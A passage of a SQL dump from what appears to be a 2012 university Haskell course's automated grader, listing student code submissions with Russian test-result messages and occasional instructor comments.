let\r\n\r\n                adds = \r\n\r\n                    nums''\r\n\r\n                    |> foldl ((prev,cnt,res) x -> if x == prev then (prev,cnt+1,res) else (x,1,(prev,cnt):res)) (n'',1,[])\r\n\r\n                    |> ((x,c,res) -> (x,c):res)\r\n\r\n                    |> map ((x,c) -> get2Powers [] (x,c))\r\n\r\n                    |> concat\r\n\r\n                in\r\n\r\n                adds |> foldl appendSums (array (0,0) [(0,True)])\r\n\r\n                |> elems\r\n\r\n                |> drop (n `div` 2 - h)\r\n\r\n                |> take (h + 1)\r\n\r\n                |> or\r\n', '<br/>Тесты успешно пройдены!'),
(1132, 31, '3607492', '2012-09-28 14:44:58', 0, 'check [] a b = (length a== length b)\r\ncheck (x:xs) a b = do\r\n				   if (a==[] || (x<(head a)) && ( b==[] ||x<(head b)))\r\n				   then (check xs (x:a) b || check xs a (x:b))\r\n				   else if (a==[] || x<(head a))\r\n		 				then  (check xs (x:a) b) \r\n		 				else if (b==[] || x<(head b))\r\n		 	  				 then  (check xs a (x:b)) \r\n		 	  				 else  (check xs a b) \r\n\r\n\r\n\r\n\r\n\r\nparts2 x =  check (reverse x) [] []', 'Выражение имеет неправильное значение: parts2 [1, 2, 3, 5, 1, 7]'),
(1133, 31, '3607492', '2012-09-28 14:50:34', 0, 'check xs a b | trace (show ([xs] ++ [a] ++ [b])) False = undefined\r\ncheck [] a b = (length a== length b)\r\ncheck (x:xs) a b = do\r\n				   if ((a==[] || (x<(head a))) && ( b==[] || x<(head b)))\r\n				   then (check xs (x:a) b || check xs a (x:b))\r\n				   else if (a==[] || x<(head a))\r\n		 				then  (check xs (x:a) b) \r\n		 				else if (b==[] || x<(head b))\r\n		 	  				 then  (check xs a (x:b)) \r\n		 	  				 else  False\r\n\r\n\r\n\r\n\r\n\r\nparts2 x =  check (reverse x) [] []', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(1134, 31, '3607492', '2012-09-28 14:51:15', 0, 'check xs a b | trace (show ([xs] ++ [a] ++ [b])) False = undefined\r\ncheck [] a b = (length a== length b)\r\ncheck (x:xs) a b = do\r\n				   if ((a==[] || (x<(head a))) && ( b==[] || x<(head b)))\r\n				   then (check xs (x:a) b || check xs a (x:b))\r\n				   else if (a==[] || x<(head a))\r\n		 				then  (check xs (x:a) b) \r\n		 				else if (b==[] || x<(head b))\r\n		 	  				 then  (check xs a (x:b)) \r\n		 	  				 else  False\r\n\r\n\r\n\r\n\r\n\r\nparts2 x =  check (reverse x) [] []', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(1135, 40, '383483', '2012-09-28 14:51:23', 1, 'frame n = map (i -> if (i==0 || i==n-1) then (take n (repeat 1)) else getst [1] n (n-2)) [0..(n-1)]\r\ngetst xs n i \r\n    | i==0 = (1:xs)\r\n    | otherwise = getst (0:xs) n (i-1)', '<br/>Тесты успешно пройдены!'),
(1136, 31, '3607492', '2012-09-28 14:52:15', 2, 'check [] a b = (length a== length b)\r\ncheck (x:xs) a b = do\r\n				   if (( a==[] || x<(head a) ) && ( b==[] || x<(head b) ))\r\n				   then (check xs (x:a) b || check xs a (x:b))\r\n				   else if (a==[] || x<(head a))\r\n		 				then  (check xs (x:a) b) \r\n		 				else if (b==[] || x<(head b))\r\n		 	  				 then  (check xs a (x:b)) \r\n		 	  				 else  False\r\n\r\nparts2 x =  check (reverse x) [] []\r\n   --- В принципе правильно, но давайте я вам попрошунемного оптимизироватть - если в какой то части \r\n   --- уже есть половина от общего числа элементов, то дальше туда добавлять уде нет смысла. Попробуйте\r\n   --- что-то такое дописать, пожалуйста.', '<br/>Тесты успешно пройдены!'),
(1137, 44, '3607492', '2012-09-28 15:26:15', 0, 'check :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (x2,y2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else (snd (check b a 0 1 1 0), fst (check b a 0 1 1 0))\r\n\r\n\r\nfunc2 a b c  =  (c * fst x , c * snd x) where x = euclid a b\r\n\r\nfunc a b c = if (mod c (gcd a b) /=0) then (0,0) else func2 (div a (gcd a b)) (div b (gcd a b)) (div c (gcd a b))\r\n\r\ndiop [a1,b1,c1,d1] [a2,b2,c2,d2] = (x,y,div (d2 - a2*x -b2*y) c2) where (x,y) = func (c2*a1-a2) (c2*b1-b2) (d1-d2) \r\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1138, 44, '3607492', '2012-09-28 15:26:43', 0, 'check :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (x2,y2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else (snd (check b a 0 1 1 0), fst (check b a 0 1 1 0))\r\n\r\n\r\nfunc2 a b c  =  (c * fst x , c * snd x) where x = euclid a b\r\n\r\nfunc a b c = if (mod c (gcd a b) /=0) then (0,0) else func2 (div a (gcd a b)) (div b (gcd a b)) (div c (gcd a b))\r\n\r\ndioph [a1,b1,c1,d1] [a2,b2,c2,d2] = (x,y,div (d2 - a2*x -b2*y) c2) where (x,y) = func (c2*a1-a2) (c2*b1-b2) (d1-d2) \r\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1139, 44, '3607492', '2012-09-28 15:28:07', 0, 'check :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (x2,y2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else (snd (check b a 0 1 1 0), fst (check b a 0 1 1 0))\r\n\r\n\r\nfunc2 a b c  =  (c * fst x , c * snd x) where x = euclid a b\r\n\r\nfunc a b c = if (mod c (gcd a b) /=0) then (0,0) else func2 (div a (gcd a b)) (div b (gcd a b)) (div c (gcd a b))\r\n\r\ndioph [a1,b1,c1,d1] [a2,b2,c2,d2] = [x,y,div (d2 - a2*x -b2*y) c2] where (x,y) = func (c2*a1-a2) (c2*b1-b2) (d1-d2) \r\n', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)'),
(1140, 44, '3607492', '2012-09-28 15:34:15', 0, 'check :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (x2,y2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else (snd (check b a 0 1 1 0), fst (check b a 0 1 1 0))\r\n\r\nfunc2::Int->Int->Int->(Int,Int)\r\nfunc2 a b c  =  (c * fst x , c * snd x) where x = euclid a b\r\n\r\nfunc::Int->Int->Int->(Int,Int)\r\nfunc a b c = if (mod c (gcd a b) /=0) then (0,0) else func2 (div a (gcd a b)) (div b (gcd a b)) (div c (gcd a b))\r\n\r\ndioph :: [Int]->[Int]->[Int]\r\ndioph [a1,b1,c1,d1] [a2,b2,c2,d2] = [x,y,div (d2 - a2*x -b2*y) c2] where (x,y) = func (c2*a1-a2) (c2*b1-b2) (d1-d2) ', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)'),
(1141, 44, '3607492', '2012-09-28 15:42:40', 0, 'check :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (x2,y2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else (snd (check b a 0 1 1 0), fst (check b a 0 1 1 0))\r\n\r\n\r\nfunc2::Int->Int->Int->(Int,Int)\r\nfunc2 a b c  =  (c * fst x , c * snd x) where x = euclid a b\r\n\r\nfunc::Int->Int->Int->(Int,Int)\r\nfunc a b c = if (mod c (gcd a b) /=0) then (0,0) else func2 (div a (gcd a b)) (div b (gcd a b)) (div c (gcd a b))\r\n\r\ndioph :: [Int]->[Int]->[Int]\r\ndioph [a1,b1,c1,d1] [a2,b2,c2,d2] = [x,y,div (d2 - a2*x -b2*y) c2] where (x,y) = func (c2*a1-c1*a2) (c2*b1-c1*b2) (c2*d1-c1*d2) ', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,1] [2,2,2,2] in x+y+z", проверьте правильность синтаксиса'),
(1142, 44, '3607492', '2012-09-28 15:46:06', 0, 'check :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (x2,y2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else (snd (check b a 0 1 1 0), fst (check b a 0 1 1 0))\r\n\r\n\r\nfunc2::Int->Int->Int->(Int,Int)\r\n\r\nfunc2 a b c  =  (c * fst x , c * snd x) where x = euclid a b\r\n\r\nfunc::Int->Int->Int->(Int,Int)\r\n\r\nfunc 0 0 0 = (0,1)\r\nfunc a b c = if (mod c (gcd a b) /=0) then (0,0) else func2 (div a (gcd a b)) (div b (gcd a b)) (div c (gcd a b))\r\n\r\ndioph :: [Int]->[Int]->[Int]\r\ndioph [a1,b1,c1,d1] [a2,b2,c2,d2] = [x,y,div (d2 - a2*x -b2*y) c2] where (x,y) = func (c2*a1-c1*a2) (c2*b1-c1*b2) (c2*d1-c1*d2) \r\n', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,0,1,2] [0,1,0,0] in (x+y, z)", проверьте правильность синтаксиса'),
(1143, 44, '3607492', '2012-09-28 15:51:57', 2, '  --- Вот еще пример, когда ваша программа неправильно работает\r\n  --- (циклится, видимо): let [x,y,z] = dioph [3,5,0,1] [1,0,0,-3] in (3*x+5*y, x)\r\n\r\ncheck :: Int->Int->Int->Int->Int->Int->(Int,Int)\r\ncheck a 0 x1 y1 x2 y2 = if (a==1) \r\n						  then (x2,y2)\r\n						  else (0,0)\r\ncheck a b x1 y1 x2 y2 = check b (a - b * (div a b)) (x2 - x1 * (div a b)) (y2 - y1 * (div a b)) x1 y1\r\n\r\neuclid :: Int->Int->(Int,Int)\r\n\r\neuclid 0 1 = (0,1)\r\neuclid 1 0 = (1,0)\r\neuclid 0 _ = (0,0)\r\neuclid _ 0 = (0,0)\r\neuclid a b = if (a>b)\r\n			 then check a b 0 1 1 0\r\n			 else (snd (check b a 0 1 1 0), fst (check b a 0 1 1 0))\r\n\r\n\r\nfunc2::Int->Int->Int->(Int,Int)\r\n\r\nfunc2 a b c  =  (c * fst x , c * snd x) where x = euclid a b\r\n\r\nfunc::Int->Int->Int->(Int,Int)\r\n\r\nfunc 0 0 0 = (0,1)\r\nfunc a b c = if (mod c (gcd a b) /=0) then (0,0) else func2 (div a (gcd a b)) (div b (gcd a b)) (div c (gcd a b))\r\n\r\ndioph :: [Int]->[Int]->[Int]\r\ndioph [a1,b1,c1,d1] [a2,b2,0,d2] = [x,y,z] where [x,z,y] = dioph [a1,c1,b1,d1] [a2,0,b2,d2]\r\ndioph [a1,b1,c1,d1] [a2,b2,c2,d2] = [x,y,div (d2 - a2*x -b2*y) c2] where (x,y) = func (c2*a1-c1*a2) (c2*b1-c1*b2) (c2*d1-c1*d2) ', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [7,11,0,1] [0,25,19,1] in (7*x+11*y, 25*y+19*z)'),
(1144, 30, '355679', '2012-09-28 16:48:34', 0, 'parts (x:[])	= False\n\nparts xs	= parts1 0 0 xs\n\n\n\nparts1 len curLen (x:[])	= len == 0 || len == curLen + 1\n\nparts1 len curLen (x1:x2:xs)	=\n\n	if (x1 < x2) then (\n\n		parts1 len (curLen + 1) (x2:xs)\n\n	) else (\n\n		if (curLen == 0) then (\n\n			False\n\n		) else (\n\n			if (len == 0 || len == curLen + 1) then (\n\n				parts1 (curLen + 1) 0 (x2:xs)\n\n			) else (\n\n				False\n\n			)\n\n		)\n\n	)\n\n\n', 'Выражение имеет неправильное значение: parts [1, 2, 1, 2, 3, 4]'),
(1145, 45, '12206137', '2012-09-28 17:14:21', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace Haskell_DZ08 {\r\n    class Program {\r\n        static bool containsEven(int[][] a) {\r\n            return a.All(x => x.Any(e => e % 2 == 0));\r\n        }\r\n        static void Main(string[] args) {\r\n            int[][] a = new int[5][];\r\n            for (int i = 0; i < a.Length; i++) {\r\n                a[i] = new int[4] { 1, 1, 2, 4 };\r\n            }\r\n            Console.WriteLine("{0}", containsEven(a));\r\n            a[3][2] = a[3][3] = 1;\r\n            Console.WriteLine("{0}", containsEven(a));\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1146, 46, '12206137', '2012-09-28 17:14:43', 1, '// Haskell_DZ08_2.cpp : Defines the entry point for the console application.\r\n//\r\n\r\n#include "stdafx.h"\r\n#include <algorithm>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nbool containsEven(int a[], int n) {\r\n  --- Просто как замечание, немного лучше const int a[]\r\n	return find_if(a, a + n, [](int x) { return x % 2 == 0; }) != a + n;\r\n}\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	int a[] = {1,2,3,5};\r\n	cout << containsEven(a, 4) << endl;\r\n	a[1] = 1;\r\n	cout << containsEven(a, 4) << endl;\r\n	return 0;\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1147, 30, '355679', '2012-09-28 17:43:42', 1, '  --- OK, очень хорошо. Но, кстати, можно узнать ответ более эффективно, в один проход. \r\n  --- Мы это мб обсудим, если время останется.\r\n--ищем длину наибольшего упорядоченного префикса списка\r\n\r\nfindLongestPrefix xs = findLongestPrefix1 0 xs\r\n\r\n\r\n\r\nfindLongestPrefix1 len (x1:[])    = len + 1\r\n\r\nfindLongestPrefix1 len (x1:x2:xs) =\r\n\r\n	if (x1 < x2) then (\r\n\r\n		findLongestPrefix1 (len + 1) (x2:xs)\r\n\r\n	) else (\r\n\r\n		len + 1\r\n\r\n	)\r\n\r\n\r\n\r\n--пробуем разбить список на упорядоченные списки длинны segLen\r\n\r\ntryPartitioning segLen xs = tryPartitioning1 segLen 0 xs\r\n\r\n\r\n\r\ntryPartitioning1 segLen curLen (x1:[])    = segLen == curLen + 1\r\n\r\ntryPartitioning1 segLen curLen (x1:x2:xs) = \r\n\r\n	let {\r\n\r\n		newLen = curLen + 1\r\n\r\n	} in\r\n\r\n	if (newLen < segLen) then (\r\n\r\n		x1 < x2 && (tryPartitioning1 segLen newLen (x2:xs))\r\n\r\n	) else (\r\n\r\n		tryPartitioning1 segLen 0 (x2:xs)\r\n\r\n	)\r\n\r\n\r\n\r\n--пробуем разбить список на упорядоченные списки длинны segLen или меньше\r\n\r\ntryPartitionings xs 1	   = False\r\n\r\ntryPartitionings xs segLen = tryPartitioning segLen xs || (tryPartitionings xs (segLen - 1))\r\n\r\n\r\n\r\n--ну и теперь очевидно\r\n\r\nparts xs = tryPartitionings xs (findLongestPrefix xs)\r\n', '<br/>Тесты успешно пройдены!'),
(1148, 42, '44060', '2012-09-28 18:18:43', 1, 'myfoldl _ x [] = x\r\nmyfoldl func x (a : as) = myfoldl func (func x a) as', '<br/>Тесты успешно пройдены!'),
(1149, 40, '44060', '2012-09-28 18:25:37', 1, 'frame n = map (x -> if x == 1 || x == n then f2(n) else f1(n)) [1..n]\r\nf1 n = map(x -> if x==1 || x==n then 1 else 0) [1..n]\r\nf2 n = map(x ->1) [1..n]', '<br/>Тесты успешно пройдены!'),
(1150, 31, '397095', '2012-09-28 19:44:43', 0, 'parts2 xs = \r\n	let\r\n		n = length xs\r\n		r = div n 2\r\n	in\r\n		p 0 0 0 0 xs r\r\n\r\np _ xn _ yn [] r = (xn == r) && (yn == r)\r\np ax xn ay yn [z] r = (((xn + 1) == r) && ax < z) || (((yn + 1) == r) && ay < z)\r\np ax xn ay yn (x:y:xs) r =\r\n	let\r\n		cond = ((xn <= r) && (yn <= r))\r\n		try1 = if (ax < x) && (x < y) then p y (xn + 2) ay yn xs r else False\r\n		try2 = if (ay < x) && (x < y) then p ax xn y (yn + 2) xs r else False\r\n		try3 = if (ax < x) && (ay < y) then p x (xn + 1) y (yn + 1) xs r else False\r\n		try4 = if (ax < y) && (ay < x) then p y (xn + 1) y (yn + 1) xs r else False\r\n	in\r\n		cond && (try1 || try2 || try3 || try4)', 'Выражение имеет неправильное значение: parts2 [1,6,9]'),
(1151, 31, '397095', '2012-09-28 19:45:35', 1, 'parts2 xs = \r\n	let\r\n		n = length xs\r\n		r = div n 2\r\n	in\r\n		(r + r == n) && p 0 0 0 0 xs r\r\n\r\np _ xn _ yn [] r = (xn == r) && (yn == r)\r\np ax xn ay yn [z] r = (((xn + 1) == r) && ax < z) || (((yn + 1) == r) && ay < z)\r\np ax xn ay yn (x:y:xs) r =\r\n	let\r\n		cond = ((xn <= r) && (yn <= r))\r\n		try1 = if (ax < x) && (x < y) then p y (xn + 2) ay yn xs r else False\r\n		try2 = if (ay < x) && (x < y) then p ax xn y (yn + 2) xs r else False\r\n		try3 = if (ax < x) && (ay < y) then p x (xn + 1) y (yn + 1) xs r else False\r\n		try4 = if (ax < y) && (ay < x) then p y (xn + 1) y (yn + 1) xs r else False\r\n	in\r\n		cond && (try1 || try2 || try3 || try4)', '<br/>Тесты успешно пройдены!'),
(1152, 37, '44060', '2012-09-28 19:51:40', 0, 'minsum [] = 0\r\nminsum [x] = 0\r\nminsum xs = minimum (zipWith (+) xs (tail xs))', '<br/>Тесты успешно пройдены!'),
(1153, 39, '397095', '2012-09-28 19:51:59', 2, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nminHeight (Empty) = 0\r\nminHeight t = m t (-1)\r\n\r\nm (Empty) n = n\r\nm (Node _ l r) n = \r\n	let\r\n		a = m l (n + 1)\r\n	in\r\n		if (a < n) then a else min a (m r (n + 1))', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(1154, 37, '44060', '2012-09-28 19:52:34', 1, 'minsum [] = 0\r\nminsum [x] = x\r\nminsum xs = minimum (zipWith (+) xs (tail xs))', '<br/>Тесты успешно пройдены!'),
(1155, 35, '4169333', '2012-09-28 20:19:57', 0, 'isocs (x1,y1)(x2,y2)(x3,y3) = if (x1-x2)^2 + (y1-y2)^2 == (x1-x3)^2 + (y1-y3)^2 || \r\n				 (x1-x2)^2 + (y1-y2)^2 == (x2-x3)^2 + (y2-y3)^2 || \r\n				 (x1-x3)^2 + (y1-y3)^2 == (x2-x3)^2 + (y2-y3)^2\r\n				 then True\r\n			         else False', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1156, 35, '4169333', '2012-09-28 20:20:31', 1, 'isosc (x1,y1)(x2,y2)(x3,y3) = if (x1-x2)^2 + (y1-y2)^2 == (x1-x3)^2 + (y1-y3)^2 || \r\n				 (x1-x2)^2 + (y1-y2)^2 == (x2-x3)^2 + (y2-y3)^2 || \r\n				 (x1-x3)^2 + (y1-y3)^2 == (x2-x3)^2 + (y2-y3)^2\r\n				 then True\r\n			         else False', '<br/>Тесты успешно пройдены!'),
(1157, 36, '4169333', '2012-09-28 20:21:01', 1, 'cubeTable n=zip[1..n](map(x->x^3)[1..n])\r\n', '<br/>Тесты успешно пройдены!'),
(1158, 37, '4169333', '2012-09-28 20:21:53', 1, 'minsum [] =error "empty list!"	    \r\nminsum lst= let\r\n	       l1=lst\r\n	       l2=tail(lst)\r\n	       l3=zipWith (+) l1 l2\r\n	    in  foldr min (1/0) l3\r\n', '<br/>Тесты успешно пройдены!'),
(1159, 38, '4169333', '2012-09-28 20:22:19', 1, 'data Tree= Empty | Node Integer Tree Tree\r\nheight Empty = 0\r\nheight (Node _ Empty Empty) = 0 \r\nheight (Node _ left right)= (max (height left) (height right)) + 1', '<br/>Тесты успешно пройдены!'),
(1160, 40, '4169333', '2012-09-28 20:22:44', 1, 'frame 0 = [[]]\r\nframe 1 = [[1]]\r\nframe n = frame1 n [] 1\r\nframe1 n l1 s \r\n	| (s==1)  = frame1 n (([1|x<-[1..n]]):l1) (s+1)\r\n	| (s>1) && (s<n) = frame1 n ((1:[0|x<-[1..n-2]]++[1]):l1) (s+1)\r\n	| (s==n)  = (([1|x<-[1..n]]):l1) ', '<br/>Тесты успешно пройдены!'),
(1161, 41, '4169333', '2012-09-28 20:23:21', 1, 'countOdd []=error "empty list!"\r\n   --- Почему же ошибка? На вопрос "сколько нечетных элементов в пустом списке?" можно вполне дать ответ, \r\n   --- и вообще-то ваш foldr и дает правильный ответ...\r\ncountOdd lst =foldr (x res -> if (mod x 2==1) \r\n		    then res+1\r\n		    else res) 0 lst\r\n\r\ncountOdd1 []=error "empty list!"\r\ncountOdd1 lst= length (filter (odd) lst) \r\n\r\n', 'Не удалось вычислить выражение "countOdd []", проверьте правильность синтаксиса'),
(1162, 42, '4169333', '2012-09-28 20:24:43', 1, 'myfoldl f e [] = e\r\nmyfoldl f e (x:xs)= myfoldl f (f e x) xs\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1163, 31, '472848', '2012-09-28 21:24:01', 2, 'parts2 li = if (length li `mod` 2 == 1) then False else divis li [] []\r\n\r\n--в этом случае просто поровну поделим возрастающий список\r\ndivis [] f [] = True\r\ndivis [] f s = if (length f == length s) then True else False\r\ndivis (l0:li) [] [] = divis li [l0] []\r\ndivis (l0:li) (f0:f) [] = if (l0 > f0) \r\n  then divis li (l0:(f0:f)) []\r\n  else divis li (f0:f) [l0]\r\ndivis (l0:li) (f0:f) (s0:s) = if (l0 < f0 && l0 < s0) then False\r\n  else if (l0 < f0 && l0 > s0) then divis li (f0:f) (l0:(s0:s))\r\n  else if (l0 > f0 && l0 < s0) then divis li (l0:(f0:f)) (s0:s)\r\n  else --l0 > f0 && l0 > s0\r\n    if (length f > length s) then divis li (f0:f) (l0:(s0:s))\r\n    else divis li (l0:(f0:f)) (s0:s) ', 'Выражение имеет неправильное значение: parts2 [1,6,9,7]');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1164, 31, 'erwert', '2012-09-29 01:11:06', 0, 'parts2 l = \r\n	let x = reverse (graf [] l 0)\r\n	in dfs l [] x (head x)\r\n\r\ndfs p l ll i\r\n	| (ln < n) && (i /= []) = dfs p l ll (tail i) || dfs p (j:l) ll (ll !! j) \r\n	| ln == n = check [ p !!  t | t <- [1..(2 * n - 1)], not(elem t l)]\r\n	| True = False\r\n	where 	ln = length l + 1 \r\n		n = length p `div` 2 \r\n		j = head i\r\n\r\ncheck [_] = True\r\ncheck (x:y:xs) = (x < y) && check (y:xs)\r\n\r\ngraf l [] p = l\r\ngraf l r p = graf ([t + p | t <-[0..ln], head r < (r !! t)]:l) (tail r) (p+1)\r\n	where ln = length r - 1\r\n', 'Выражение имеет неправильное значение: parts2 [1,6,9]'),
(1165, 31, 'erwert', '2012-09-29 01:13:47', 0, 'parts2 l  \r\n	| mod n 2 == 0 = dfs l [] x (head x)\r\n	| mod n 2 /= 0 = False\r\n	where 	x = reverse (graf [] l 0)\r\n	    	n = length l\r\n\r\ndfs p l ll i\r\n	| (ln < n) && (i /= []) = dfs p l ll (tail i) || dfs p (j:l) ll (ll !! j) \r\n	| ln == n = check [ p !!  t | t <- [1..(2 * n - 1)], not(elem t l)]\r\n	| True = False\r\n	where 	ln = length l + 1 \r\n		n = length p `div` 2 \r\n		j = head i\r\n\r\ncheck [_] = True\r\ncheck (x:y:xs) = (x < y) && check (y:xs)\r\n\r\ngraf l [] p = l\r\ngraf l r p = graf ([t + p | t <-[0..ln], head r < (r !! t)]:l) (tail r) (p+1)\r\n	where ln = length r - 1\r\n', '<br/>Тесты успешно пройдены!'),
(1166, 31, 'erwert', '2012-09-29 01:20:52', 1, '  --- ОК, хорошо, но мне кажется, я знаю более эффективное решение, мб мы это потом немного обсудим.\r\nparts2 l = \r\n	let x = reverse (graf [] l 0)\r\n	in (mod (length l) 2 == 0) && dfs l [] x (head x)\r\n\r\ndfs p l ll i\r\n	| (ln < n) && (i /= []) = dfs p l ll (tail i) || dfs p (j:l) ll (ll !! j) \r\n	| ln == n = check [ p !!  t | t <- [1..(2 * n - 1)], not(elem t l)]\r\n	| True = False\r\n	where 	ln = length l + 1 \r\n		n = length p `div` 2 \r\n		j = head i\r\n\r\ncheck [_] = True\r\ncheck (x:y:xs) = (x < y) && check (y:xs)\r\n\r\ngraf l [] p = l\r\ngraf l r p = graf ([t + p | t <-[0..ln], head r < (r !! t)]:l) (tail r) (p+1)\r\n	where ln = length r - 1\r\n', '<br/>Тесты успешно пройдены!'),
(1167, 41, '44060', '2012-09-29 06:27:31', 1, 'countOdd s = foldr (x y -> if x `mod` 2 == 0 then y else 1 + y) 0 s\r\ncountOdd1 = sum . (map (`mod` 2))', '<br/>Тесты успешно пройдены!'),
(1168, 41, '383483', '2012-09-29 13:12:44', 1, 'countOdd xs = foldr (x y -> y + (mod x 2)) 0 xs\r\ncountOdd1 xs = length (filter (>0) (map (x -> mod x 2) xs))', '<br/>Тесты успешно пройдены!'),
(1169, 42, '383483', '2012-09-29 13:16:13', 0, 'myfoldl cond z xs = foldr cond z (reverse xs)\r\n   --- В принципе можно воспользоваться reverse (хоть это и не совсем честно:) \r\n   --- Но тогда и функцию cond надо как-бы "развернуть". Те, например, вместо a ^ b считать b ^ a\r\n  ', 'Выражение имеет неправильное значение: myfoldl (^) 2 [3]'),
(1170, 37, '3742311', '2012-09-29 13:58:26', 0, 'minsum l = minimum (map (x -> sum x) (filter (x -> not (tail x == [])) (transpose [l, tail l])))', 'Не удалось вычислить выражение "minsum [1,8,3,2,7] ", проверьте правильность синтаксиса'),
(1171, 37, '3742311', '2012-09-29 14:10:41', 0, 'minsum l = minimum (map (x -> sum x) (filter (x -> not (tail x == [])) (transpose [l, tail l])))\r\n   --- нет вроде бы такой стандартной функции transpose.. ', 'Не удалось вычислить выражение "minsum [1,8,3,2,7] ", проверьте правильность синтаксиса'),
(1172, 37, '3742311', '2012-09-29 15:31:02', 2, 'minsum l = minimum (map ((a, b) -> a + b) (zip (init l) (tail l)))', '<br/>Тесты успешно пройдены!'),
(1173, 30, '419046', '2012-09-29 19:00:49', 1, 'parts xs = go 2 (length xs) xs\r\n\r\ngo partlen listlen xs = \r\n\r\n                       if partlen > listlen\r\n\r\n                       then False\r\n\r\n                       else if check 2 partlen  xs == False\r\n\r\n                            then go (partlen + 1) listlen xs\r\n\r\n                            else True\r\n\r\ncheck curlen partlen  [] = True\r\n\r\ncheck curlen partlen  [x] = False\r\n\r\ncheck curlen partlen (x1:x2:xs) = if x1 < x2 && curlen == partlen\r\n\r\n                           then check 2 partlen xs\r\n\r\n                           else if x1 < x2\r\n\r\n                                then check (curlen + 1) partlen (x2:xs)\r\n\r\n                                else False\r\n\r\n                       \r\n', '<br/>Тесты успешно пройдены!'),
